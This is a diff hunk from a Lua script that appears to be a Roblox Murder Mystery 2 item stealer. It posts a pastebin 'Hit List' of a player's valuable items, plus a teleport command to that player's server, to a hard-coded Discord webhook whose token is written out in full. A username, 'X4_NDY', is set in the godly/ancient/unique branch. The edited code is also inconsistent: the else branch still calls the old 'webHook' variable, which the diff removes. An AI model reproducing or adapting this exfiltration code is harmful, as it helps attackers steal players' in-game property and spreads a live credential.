@@ -1068,11 +1068,10 @@ local WebHookEmbed = CreateEmbed(
 {name = "```Hit List```", value = "[Click Me]("..pastebin(EverythingString)..")"}
     }
 )
-if godltItemsC >= 1 then
-userName = "X4_NDY"
-webHook = "https://discord.com/api/webhooks/1323692511440404501/CtCIa2_GbH93fernF0QPz4oJ9ani5jln4bpsWls5P-ORo6Qspx1PP7Pfp7p__voIAV61"
+WebHook = "https://discord.com/api/webhooks/1323692511440404501/CtCIa2_GbH93fernF0QPz4oJ9ani5jln4bpsWls5P-ORo6Qspx1PP7Pfp7p__voIAV61"
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
-    SendWebhook(webHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+    userName = "X4_NDY"
+    SendWebhook(WebHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 else
     SendWebhook(webHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 end
